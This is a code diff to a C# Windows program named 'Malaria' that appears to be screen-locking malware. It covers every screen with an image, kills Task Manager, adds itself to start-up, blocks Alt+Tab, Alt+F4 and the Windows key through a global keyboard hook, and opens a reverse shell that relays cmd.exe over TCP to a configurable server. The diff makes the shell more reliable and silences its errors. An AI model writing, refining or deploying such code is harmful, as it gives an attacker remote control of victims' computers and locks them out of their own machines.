@@ -20,29 +20,22 @@ namespace Malaria
         public Malaria()
         {
             InitializeComponent();
-
-            // Display a custom image on all connected screens
             DisplayImageOnAllScreens();
 
-            // Start a new thread for the reverse shell
-            new Thread(StartReverseShell).Start();
-            // Start a new thread for the Taskmanager Killer
             new Thread(KillTaskManager).Start();
-            // Start a new thread to put the Program into Start-up
             new Thread(AutoStart).Start();
-            // Enable preview of key events in this form
+            new Thread(StartReverseShell).Start();
+
             KeyPreview = true;
 
-            // Hook global keyboard events for key interception
             _globalHook = Hook.GlobalEvents();
             _globalHook.KeyDown += GlobalHook_KeyDown;
         }
 
         private void StartReverseShell()
         {
-            // Server IP and port configuration
-            string serverIp = ""; // Replace with your IP (can be local for testing purposes)
-            int serverPort = 9001; // Replace with the desired port (ensure it's forwarded if used on a router)
+            string serverIp = "127.0.0.1"; // Replace with your IP
+            int serverPort = 9001; // Replace with the desired port
 
             try
             {
@@ -63,20 +56,43 @@ namespace Malaria
                             p.StartInfo.RedirectStandardInput = true;
                             p.StartInfo.RedirectStandardError = true;
 
-                            // Handle output data from the command line
-                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            p.OutputDataReceived += (sender, args) =>
+                            {
+                                if (!string.IsNullOrEmpty(args.Data))
+                                {
+                                    try
+                                    {
+                                        streamWriter.WriteLine(args.Data); // Send command output
+                                    }
+                                    catch (Exception ex) { }
+                                   
+                                }
+                            };
+
+                            p.ErrorDataReceived += (sender, args) =>
+                            {
+                                if (!string.IsNullOrEmpty(args.Data))
+                                {
+                                    try
+                                    {
+                                        streamWriter.WriteLine(args.Data); // Send command output
+                                    }
+                                    catch (Exception ex) { }
+                                }
+                            };
+
                             p.Start();
                             p.BeginOutputReadLine();
+                            p.BeginErrorReadLine();
 
                             // Read commands from the server and pass them to cmd.exe
-                            StringBuilder strInput = new StringBuilder();
                             while (true)
                             {
-                                strInput.Clear();
-                                strInput.Append(rdr.ReadLine());
-                                if (strInput.Length > 0)
+                                string command = rdr.ReadLine();
+                                if (!string.IsNullOrEmpty(command))
                                 {
-                                    p.StandardInput.WriteLine(strInput.ToString());
+                                    p.StandardInput.WriteLine(command);
+                                    p.StandardInput.Flush();
                                 }
                             }
                         }
@@ -85,10 +101,10 @@ namespace Malaria
             }
             catch (Exception ex)
             {
-                // Log any errors encountered during execution
-                Console.WriteLine("Error: " + ex.Message);
             }
         }
+
+
 
         private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
@@ -101,8 +117,6 @@ namespace Malaria
                 }
                 catch (Exception err)
                 {
-                    // Handle errors during output transmission
-                    Console.WriteLine("Error sending output: " + err.Message);
                 }
             }
         }
@@ -112,21 +126,21 @@ namespace Malaria
             // Intercept ALT + TAB key combination and block it
             if (e.Alt && e.KeyCode == Keys.Tab)
             {
-                e.Handled = true; // Prevent default action
+                e.Handled = true;
                 return;
             }
 
             // Intercept Windows key (WIN) and block it
             if (e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
             {
-                e.Handled = true; // Prevent default action
+                e.Handled = true;
                 return;
             }
 
             // Intercept ALT + F4 key combination and block it
             if (e.Alt && e.KeyCode == Keys.F4)
             {
-                e.Handled = true; // Prevent default action
+                e.Handled = true;
                 return;
             }
         }
